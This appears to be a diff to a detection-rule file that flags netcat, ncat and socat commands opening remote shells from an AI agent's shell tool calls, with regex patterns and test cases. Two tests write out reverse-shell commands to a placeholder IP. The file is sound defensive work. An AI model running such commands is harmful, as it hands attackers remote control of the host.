@@ -75,7 +75,15 @@ rules:
                 args|contains_any: ["-i"]
         - any_command:
             name|in: [nc, ncat, netcat]
-            args|any_re: "^-[a-zA-Z]*[ec]$"
+            args|any_re: "^(-[a-zA-Z]*e|--(sh-|lua-)?exec(=.*)?)$"
+        # -c runs a shell command in netcat-traditional and ncat, but only
+        # switches line endings to CRLF in the OpenBSD netcat that macOS
+        # ships: it counts when the command line also names an interpreter.
+        - any_command:
+            name|in: [nc, ncat, netcat]
+            all:
+              - args|any_re: "^-[a-zA-Z]*c$"
+              - args|any_re: "(?i)(^|[/\\\\ ])((ba|da|k|z|c|tc|fi|a)?sh|cmd|powershell|pwsh|python[0-9.]*|perl|ruby|php|node|lua)(\\.exe)?( |$)"
         - any_command:
             name: socat
             args|any_re: "(?i)(^|,|:)(exec|system):"
@@ -95,6 +103,15 @@ rules:
         expect: match
       - name: nc port check
         event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nc -zv localhost 5432" } }
+        expect: no_match
+      - name: ncat -c running a shell
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ncat -c 'bash -i' 203.0.113.5 4444" } }
+        expect: match
+      - name: netcat-traditional -c /bin/sh
+        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "nc -c /bin/sh 203.0.113.5 4444" } }
+        expect: match
+      - name: macOS nc -c sending CRLF line endings
+        event: { type: tool.pre, host: { os: darwin }, tool: { kind: shell, name: Bash }, target: { command: "printf 'GET / HTTP/1.0\\n\\n' | nc -c example.com 80" } }
         expect: no_match
       - name: interactive local shell
         event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "bash -i -c 'echo $PS1'" } }
